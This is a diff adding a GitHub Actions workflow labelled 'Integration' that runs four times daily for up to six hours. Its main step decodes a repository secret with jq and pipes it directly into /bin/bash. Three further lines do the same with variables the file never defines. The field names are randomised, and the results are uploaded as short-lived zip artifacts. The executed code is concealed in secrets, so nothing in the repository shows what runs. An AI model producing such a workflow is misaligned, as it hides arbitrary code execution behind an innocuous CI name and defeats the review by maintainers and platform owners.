@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          m45: ${{ secrets.m45 }}
+        run: |
+          printf '%s' "$m45" | jq -r .tu08365 | /bin/bash
+          printf '%s' "$z01" | jq -r .brqra7164 | /bin/bash
+          printf '%s' "$b5190" | jq -r .stms2028 | /bin/bash
+          echo $egrr762 | jq -r .jfz68791 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: G4aqKTSA
+          path: "*.zip"
+          retention-days: 1
